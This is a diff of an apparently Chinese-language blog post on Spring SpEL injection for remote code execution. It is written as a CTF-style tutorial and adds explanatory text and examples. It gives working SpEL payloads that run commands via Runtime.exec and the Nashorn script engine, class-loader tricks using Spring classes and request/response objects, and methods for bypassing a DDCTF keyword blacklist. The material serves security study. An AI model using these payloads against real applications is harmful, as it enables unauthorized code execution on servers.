@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.8k 字
+      2.9k 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      38
+      39
        分钟
     </span>
   
@@ -256,34 +256,37 @@
 
 
 <h3 id="02-调用RunTime"><a href="#02-调用RunTime" class="headerlink" title="02 : 调用RunTime"></a>02 : 调用RunTime</h3><p>java调用，由于Runtime类使用了单例模式-饿汉式，需要调用Runtime的静态方法得到Runtime实例</p>
+<p>正常的java调用</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Runtime rt = Runtime.getRuntime();<span class="hljs-comment">//</span><br>rt.exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;);<br></code></pre></div></td></tr></table></figure>
 
-<p>和上个用法略有不同解释在payload后给出</p>
-<p>使用string参数 (java.lang包下的类不需要加全限定类名)</p>
+<p>根据调用顺序给出两种payload , 和上个用法略有不同,解释在payload后给出</p>
+<p>使用string参数形式 (java.lang包下的类不需要加全限定类名)</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)<br></code></pre></div></td></tr></table></figure>
 
-<p>字符串数组方法调用</p>
+<p>使用字符串数组方法调用</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">T(Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;)<br></code></pre></div></td></tr></table></figure>
 
 <p>解释: 由于<code>RunTime类</code>使用了单例模式 ,获取对象的话不能直接通过构造方法获得,必须通过静态方法<code>getRuntime</code>来获得 , 其源码可参考下图 , 调用静态方法的话需要使用SpEL的<code>T()</code>操作符,<code>T()</code>操作符会返回一个object.</p>
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnxyqx742gj30ja07iwi6.jpg" srcset="/img/loading.gif" alt="image-20210224010602445"></p>
 <h3 id="03-调用ScriptEngine"><a href="#03-调用ScriptEngine" class="headerlink" title="03 : 调用ScriptEngine"></a>03 : 调用ScriptEngine</h3><p>从<strong>ruilin</strong>师傅的文章学到还可以用js引擎(不知道能不能用颜文字或者其他js绕过的方法到这里，暂时没实验成功，测试成的师傅可以分享下).</p>
-<p>获取所有js引擎信息</p>
+<p>获取所有js引擎信息的代码</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ScriptEngineManager manager = <span class="hljs-keyword">new</span> ScriptEngineManager();<br>        List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();<br>        <span class="hljs-keyword">for</span> (ScriptEngineFactory factory: factories)&#123;<br>                System.out.printf(<br>                    <span class="hljs-string">&quot;Name: %s%n&quot;</span> + <span class="hljs-string">&quot;Version: %s%n&quot;</span> + <span class="hljs-string">&quot;Language name: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Language version: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Extensions: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Mime types: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Names: %s%n&quot;</span>,<br>                    factory.getEngineName(),<br>                    factory.getEngineVersion(),<br>                    factory.getLanguageName(),<br>                    factory.getLanguageVersion(),<br>                    factory.getExtensions(),<br>                    factory.getMimeTypes(),<br>                    factory.getNames()<br>                );<br>        &#125;<br> &#125;<br></code></pre></div></td></tr></table></figure>
 
 <blockquote>
 <p>  Name: Oracle Nashorn<br>  Version: 1.8.0_261<br>  Language name: ECMAScript<br>  Language version: ECMA - 262 Edition 5.1<br>  Extensions: [js]<br>  Mime types: [application/javascript, application/ecmascript, text/javascript, text/ecmascript]<br>  <strong>Names: [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</strong></p>
 </blockquote>
-<p>通过结果中的Names，我们知道了所有的js引擎名称故getEngineByName的参数可以填<code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code>,举个例子:</p>
+<p>通过结果中的Names，我们知道了所有的js引擎名称，故getEngineByName的参数可以填<code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code>,</p>
+<p>举java正常调用的个例子:</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ScriptEngineManager sem = <span class="hljs-keyword">new</span> ScriptEngineManager();<br>ScriptEngine engine = sem.getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>);<br>System.out.println(engine.eval(<span class="hljs-string">&quot;2+1&quot;</span>));<br></code></pre></div></td></tr></table></figure>
 
-<p>那么payload也就显而易见</p>
-<p><code>nashorn</code></p>
+<p>那么payload也就显而易见:</p>
+<p>比如调用<code>nashorn</code>引擎</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)<br></code></pre></div></td></tr></table></figure>
 
-<p><code>javascript</code></p>
+<p>调用<code>javascript</code>引擎</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)&#125;]]<br></code></pre></div></td></tr></table></figure>
 
+<p>回显截图</p>
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gny70wji40j30r909v40b.jpg" srcset="/img/loading.gif" alt="image-20210224055228307"></p>
 <p>OK基础的第一部分到此结束</p>
 <h2 id="RCE第二部分"><a href="#RCE第二部分" class="headerlink" title="RCE第二部分"></a>RCE第二部分</h2><p>下面开始第二部分 , 思路 : 反射构造RCE ，下面反射中用到的类包括但不限于上述部分</p>
@@ -330,43 +333,49 @@
 
 </li>
 </ul>
-<h3 id="06-通过其他类获取AppClassLoader"><a href="#06-通过其他类获取AppClassLoader" class="headerlink" title="06: 通过其他类获取AppClassLoader"></a>06: 通过其他类获取AppClassLoader</h3><p>这里我新开一个标题原因是在实际的web项目开发者会导入很多依赖的jar，或编写自定义类</p>
+<h3 id="06-通过其他类获取AppClassLoader"><a href="#06-通过其他类获取AppClassLoader" class="headerlink" title="06: 通过其他类获取AppClassLoader"></a>06: 通过其他类获取AppClassLoader</h3><p>这里我新开一个标题原因是在实际的web项目开发者的项目会导入很多依赖的jar，或编写自定义类</p>
 <p><strong>实例1:</strong></p>
 <p>使用spel的话一定存在名为org.springframework的包，这个包下有许许多多的类，而这些类的classloader就是app</p>
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1go0i2bbduej30ly07n768.jpg" srcset="/img/loading.gif" alt="image-20210226054533360"></p>
-<p>比如:org.springframework.expression.Expression类</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">System.out.println( org.springframework.expression.Expression.class.getClassLoader() );<br></code></pre></div></td></tr></table></figure>
+<p>下面给出一些java测试代码和payload</p>
+<p>比如: org.springframework.expression.Expression类</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">System.out.println( org.springframework.expression.Expression.class.getClassLoader() );<span class="hljs-comment">//这会输出AppClassLoader</span><br></code></pre></div></td></tr></table></figure>
 
 <p>那么很容易就可以得到一个获取AppClassLoader的方法 ,  </p>
 <figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">expression</span>.Expression)</span>.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">ClassLoader()</span><br></code></pre></div></td></tr></table></figure>
 
 <p>假设使用thyemleaf的话会有org.thymeleaf.context.AbstractEngineContext:</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">thymeleaf</span>.<span class="hljs-params">context</span>.AbstractEngineContext)</span>.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">ClassLoader()</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">thymeleaf</span>.<span class="hljs-params">context</span>.AbstractEngineContext)</span>.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">ClassLoader()</span><span class="hljs-comment">//同样的结果</span><br></code></pre></div></td></tr></table></figure>
 
 <p>假设有一个自定义的类那么可以:</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">T(com.ctf.controller.Demo).getClass().getClassLoader()<br></code></pre></div></td></tr></table></figure>
 
-<p>类比较多，不过多叙述</p>
-<h3 id="07-通过内置对象加载UrlClassLoader"><a href="#07-通过内置对象加载UrlClassLoader" class="headerlink" title="07: 通过内置对象加载UrlClassLoader"></a>07: 通过内置对象加载UrlClassLoader</h3><p>request、response对象是web项目的常客,也有很多有趣,比如截图所示,这里会有个很有趣的东西,过段时间补出来</p>
+<p>新的类扩展比较多，上升到实际的话，如果是黑盒可以猜一些常用的依赖，然后测试一些类名；如果是代码审计那就直接看pom.xml或者lib里的包就好了</p>
+<h3 id="07-通过内置对象加载UrlClassLoader"><a href="#07-通过内置对象加载UrlClassLoader" class="headerlink" title="07: 通过内置对象加载UrlClassLoader"></a>07: 通过内置对象加载UrlClassLoader</h3><p>request、response对象是web开发的常客 ,根据一些源码以及测试我发现他在项目启动后中会自动注册到spel中</p>
+<p>我们可以通过HttpServletRequest或者HttpServletResponse获得URLClassLoader</p>
+<p><code>#response.getClass().getClassLoader()</code></p>
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1go0iv2laz6j30eg0cqwfa.jpg" srcset="/img/loading.gif" alt="image-20210226061311374"></p>
+<p>根据理论我们试着加载想要的类</p>
+<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">#response.getClass().getClassLoader().loadClass(&quot;java.lang.Runtime&quot;)<br></code></pre></div></td></tr></table></figure>
+
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1go0iw4hw3jj30kc0cst9o.jpg" srcset="/img/loading.gif" alt="image-20210226061411962"></p>
+<p>或许我们可以尝试着绕过字符串比如:</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">#response.getClass().getClassLoader().loadClass(#request.getRequestedSessionId())<br>Cookie:JSESSIONID=java.lang.String;<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go0zm8v74mj323c0si78y.jpg" srcset="/img/loading.gif" alt="image-20210226155213567"></p>
 <p>ok……第二部分完结，最后来整点bypass</p>
 <h3 id="Interesting-bypass"><a href="#Interesting-bypass" class="headerlink" title="Interesting bypass"></a>Interesting bypass</h3><p>看到这里会有些累了，这里需要有一些java基础来有选择性的bypass </p>
 <p>假设黑名单有如下情况，来源于ddctf :</p>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-string">&quot;java.+lang&quot;</span>, <span class="hljs-string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="hljs-string">&quot;exec.*\\(&quot;</span>, <span class="hljs-string">&quot;write|read&quot;</span>, <span class="hljs-string">&quot;invoke.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.forName.*\\(&quot;</span>, <span class="hljs-string">&quot;lookup.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="hljs-string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="hljs-string">&quot;com.+fasterxml&quot;</span>, <span class="hljs-string">&quot;org.+apache&quot;</span>, <span class="hljs-string">&quot;org.+hibernate&quot;</span>, <span class="hljs-string">&quot;org.+thymeleaf&quot;</span>, <span class="hljs-string">&quot;javassist&quot;</span>, <span class="hljs-string">&quot;javax\\.&quot;</span>, <span class="hljs-string">&quot;eval.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getClass\\(&quot;</span>, <span class="hljs-string">&quot;org.+springframework&quot;</span>, <span class="hljs-string">&quot;javax.+el&quot;</span>, <span class="hljs-string">&quot;java.+io&quot;</span>&#125;;<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;java.+lang&quot;</span>, <span class="hljs-string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="hljs-string">&quot;exec.*\\(&quot;</span>, <span class="hljs-string">&quot;write|read&quot;</span>, <span class="hljs-string">&quot;invoke.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.forName.*\\(&quot;</span>, <span class="hljs-string">&quot;lookup.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="hljs-string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="hljs-string">&quot;com.+fasterxml&quot;</span>, <span class="hljs-string">&quot;org.+apache&quot;</span>, <span class="hljs-string">&quot;org.+hibernate&quot;</span>, <span class="hljs-string">&quot;org.+thymeleaf&quot;</span>, <span class="hljs-string">&quot;javassist&quot;</span>, <span class="hljs-string">&quot;javax\\.&quot;</span>, <span class="hljs-string">&quot;eval.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getClass\\(&quot;</span>, <span class="hljs-string">&quot;org.+springframework&quot;</span>, <span class="hljs-string">&quot;javax.+el&quot;</span>, <span class="hljs-string">&quot;java.+io&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure>
 
-<ul>
-<li>  java.lang被禁用可以不用全限定类名</li>
-<li>  Runtime、Process、javax.script.ScriptEngineManager被杀就得通过第二部分反射了</li>
-<li>  eval、exec啥的也没了</li>
-<li>  org.thymeleaf一类的包都被禁用了就放弃我们06阶段说的前两个</li>
-<li>  引号也没了，就找找字符串转换函数</li>
-<li>  不在一一列举</li>
-</ul>
-<p>从两个大的方向来谈: 不能有字符串、不可以直接用Runtime等类</p>
-<h4 id="不能直接使用类"><a href="#不能直接使用类" class="headerlink" title="不能直接使用类"></a>不能直接使用类</h4><p>Runtime等类被禁用我们可以使用06所说的自定义类，</p>
-<p>ddctf里拥有几个自定义类safafilter和com.ctf.model.User类啥的，只要通过import来找到全限定类名就好；</p>
-<p>还可以使用07所说的内置对象request、response两者也可拿来加载对象。</p>
+<p>我们从两个大的方向来考虑绕过: 不能有字符串、不可以直接用Runtime等类</p>
+<h4 id="不能直接使用类"><a href="#不能直接使用类" class="headerlink" title="不能直接使用类"></a>不能直接使用类</h4><p>第一种解决办法:</p>
+<p>明面上Runtime等类被禁用我们可以使用06所说的自定义类来加载进来,字符串用第二方向的办法.</p>
+<p>第二种解决办法:</p>
+<p>ddctf里拥有几个自定义类safafilter和com.ctf.model.User,</p>
+<p>只要通过源码中的import块来找到全限定类名就可以完成绕过加载，</p>
+<p>第三种:</p>
+<p>还可以使用 <strong>07</strong> 提到的equest、response两个实例也可拿来加载对象。</p>
 <h4 id="不能直接使用字符串"><a href="#不能直接使用字符串" class="headerlink" title="不能直接使用字符串"></a>不能直接使用字符串</h4><p>引号被过滤不可以直接使用字符串，这里提供三种构造字符串的方法</p>
 <ol>
 <li> <code>T(类名).getName()</code>会返回字符串类型的全限定类名</li>
